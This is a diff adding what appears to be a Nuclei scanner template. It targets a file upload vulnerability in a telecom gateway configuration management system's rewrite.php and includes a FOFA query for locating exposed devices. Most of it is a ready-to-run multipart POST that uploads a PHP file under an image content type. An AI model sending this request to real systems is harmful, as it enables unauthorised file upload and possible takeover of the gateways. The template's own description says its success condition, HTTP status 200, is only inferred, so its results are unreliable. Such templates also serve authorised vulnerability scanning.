@@ -1,0 +1,42 @@
+id: poc-ka0ggb170ledauh4
+info:
+  name: 电信网关配置管理系统 rewrite.php 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ka0ggb170ledauh4
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ka0ggb170ledauh4
+    fofa: body="img/login_bg3.png" && body="系统登录"
+http:
+- raw:
+  - 'POST /manager/teletext/material/rewrite.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryOKldnDPT
+
+    Content-Disposition: form-data; name="tmp_name"; filename="test.php"
+
+    Content-Type: image/png
+
+    ------WebKitFormBoundaryOKldnDPT
+
+    Content-Disposition: form-data; name="uploadtime"
+
+    ------WebKitFormBoundaryOKldnDPT--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
